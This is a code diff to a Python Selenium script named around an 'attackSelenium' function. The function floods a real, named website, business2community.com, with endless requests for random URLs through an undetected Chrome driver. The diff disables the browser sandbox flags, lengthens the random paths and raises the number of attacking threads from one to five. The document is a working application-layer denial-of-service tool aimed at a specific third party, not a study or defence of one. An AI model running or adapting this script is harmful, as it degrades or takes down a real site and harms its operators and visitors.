@@ -263,11 +263,11 @@ def get_driver():
 	global PATCHED_DRIVER_PATH
 
 	options = uc.ChromeOptions()
-	options.add_argument('--no-sandbox')
+	# options.add_argument('--no-sandbox')
 	options.add_argument('--window-size=1920,1080')
 	# todo: this param shows a warning in chrome head-full
-	options.add_argument('--disable-setuid-sandbox')
-	options.add_argument('--disable-dev-shm-usage')
+	# options.add_argument('--disable-setuid-sandbox')
+	# options.add_argument('--disable-dev-shm-usage')
 	# options.add_argument('--no-zygote')
 	# options.add_argument('--blink-settings=imagesEnabled=false')
 	
@@ -330,7 +330,7 @@ def attackSelenium(baseUrl):
 	while True:
 		try:
 			# url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
-			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(10))
+			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(random.randint(11,20)))
 			driver.get(url)
 
 			html_element = driver.find_element(By.TAG_NAME, "html")
@@ -393,7 +393,7 @@ def attackSelenium(baseUrl):
 			#input()
 
 
-for i in range(1):
+for i in range(5):
 	Thread(target=attackSelenium, args=['https://www.business2community.com']).start()
 input()
 
